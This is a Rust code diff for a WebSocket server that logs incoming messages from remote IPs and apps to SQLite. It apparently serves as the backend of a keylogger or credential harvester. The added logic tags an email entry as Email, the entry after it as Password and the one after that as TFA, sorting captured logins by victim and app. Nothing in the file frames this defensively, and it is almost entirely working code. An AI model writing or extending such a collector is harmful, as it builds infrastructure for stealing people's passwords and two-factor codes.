@@ -22,14 +22,13 @@ pub mod cli {
 }
 
 pub mod server {
-
-    use std::{net::Ipv4Addr, str::FromStr};
-
     use actix_web::{App, Error, HttpRequest, HttpResponse, HttpServer, rt, web};
     use actix_ws::AggregatedMessage;
+    use email_address::EmailAddress;
     use futures_util::StreamExt as _;
     use serde::Deserialize;
     use sqlx::{Pool, Sqlite, SqlitePool, sqlite::SqliteConnectOptions};
+    use std::{net::Ipv4Addr, str::FromStr};
 
     pub async fn run(port: u16) -> Result<(), std::io::Error> {
         HttpServer::new(|| App::new().route("/", web::get().to(handle_wsmessage)))
@@ -49,23 +48,21 @@ pub mod server {
             .max_continuation_size(2_usize.pow(20));
 
         rt::spawn(async move {
-    let _session = session;
+            let _session = session;
 
-    let pool = match connect_db().await {
-        Ok(pool) => pool,
-        Err(err) => {
-            eprintln!("Error: Failed to connect to the database.");
-            eprintln!("Error output was: {err}");
-            return;
-        }
-    };
+            let pool = match connect_db().await {
+                Ok(pool) => pool,
+                Err(err) => {
+                    eprintln!("Error: Failed to connect to the database.");
+                    eprintln!("Error output was: {err}");
+                    return;
+                }
+            };
 
-    while let Some(msg) = stream.next().await {
-        match msg {
-            Ok(AggregatedMessage::Text(msg)) => {
-                match parse_message(msg.to_string()) {
-                    Ok(payload) => {
-                        match store_db(payload, &pool).await {
+            while let Some(msg) = stream.next().await {
+                match msg {
+                    Ok(AggregatedMessage::Text(msg)) => match parse_message(msg.to_string()) {
+                        Ok(payload) => match store_db(payload, &pool).await {
                             Ok(()) => {}
                             Err(err) => {
                                 eprintln!(
@@ -73,26 +70,24 @@ pub mod server {
                                 );
                                 eprintln!("Error output was: {err}");
                             }
+                        },
+                        Err(err) => {
+                            eprintln!("Error: Failed to parse the WebSocket input.");
+                            eprintln!("Error output was: {err}");
+                            eprintln!("Tip: the message must be a JSON in this format:");
+                            eprintln!(
+                                r#"{{ "ip": "123.123.123.123", "app": "text", "content": "text" }}"#
+                            );
                         }
-                    }
+                    },
+                    Ok(_) => (),
                     Err(err) => {
-                        eprintln!("Error: Failed to parse the WebSocket input.");
-                        eprintln!("Error output was: {err}");
-                        eprintln!("Tip: the message must be a JSON in this format:");
-                        eprintln!(
-                            r#"{{ "ip": "123.123.123.123", "app": "text", "content": "text" }}"#
-                        );
+                        eprintln!("Error: WebSocket stream error: {err}");
+                        break;
                     }
                 }
             }
-            Ok(_) => (),
-            Err(err) => {
-                eprintln!("Error: WebSocket stream error: {err}");
-                break;
-            }
-        }
-    }
-});
+        });
 
         Ok(res)
     }
@@ -111,6 +106,42 @@ pub mod server {
         Ok(pool)
     }
 
+    async fn check_last_log_type(
+        ip: &str,
+        app: &str,
+        pool: &Pool<Sqlite>,
+    ) -> Result<String, sqlx::Error> {
+        let row: Option<(String,)> = sqlx::query_as(
+            "SELECT type FROM logs WHERE ip = ? AND app = ? ORDER BY id DESC LIMIT 1",
+        )
+        .bind(ip)
+        .bind(app)
+        .fetch_optional(pool)
+        .await?;
+
+        Ok(row.map(|r| r.0).unwrap_or_else(|| "None".to_string()))
+    }
+
+    async fn check_content(payload: &LogPayload, pool: &Pool<Sqlite>) -> ContentTypes {
+        if EmailAddress::is_valid(&payload.content) {
+            return ContentTypes::Email;
+        }
+
+        let last_type = match check_last_log_type(&payload.ip.to_string(), &payload.app, pool).await
+        {
+            Ok(t) => t,
+            Err(_) => return ContentTypes::PlainText,
+        };
+
+        if last_type == "Email" {
+            ContentTypes::Password
+        } else if last_type == "Password" {
+            ContentTypes::TFA
+        } else {
+            ContentTypes::PlainText
+        }
+    }
+
     async fn store_db(payload: LogPayload, pool: &Pool<Sqlite>) -> Result<(), sqlx::Error> {
         sqlx::query(
             r#"
@@ -119,7 +150,8 @@ pub mod server {
                 timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                 ip TEXT,
                 app TEXT,
-                content TEXT
+                content TEXT,
+                type TEXT
                 );
         "#,
         )
@@ -128,13 +160,19 @@ pub mod server {
 
         sqlx::query(
             r#"
-            INSERT INTO logs (ip, app, content)
-            VALUES (?, ?, ?)
+            INSERT INTO logs (ip, app, content, type)
+            VALUES (?, ?, ?, ?)
         "#,
         )
         .bind(&payload.ip.to_string())
         .bind(&payload.app)
         .bind(&payload.content)
+        .bind(match check_content(&payload, pool).await {
+            ContentTypes::Email => "Email",
+            ContentTypes::Password => "Password",
+            ContentTypes::TFA => "TFA",
+            ContentTypes::PlainText => "PlainText"
+        })
         .execute(pool)
         .await?;
 
@@ -146,5 +184,12 @@ pub mod server {
         ip: Ipv4Addr,
         app: String,
         content: String,
+    }
+
+    enum ContentTypes {
+        Email,
+        Password,
+        TFA,
+        PlainText,
     }
 }
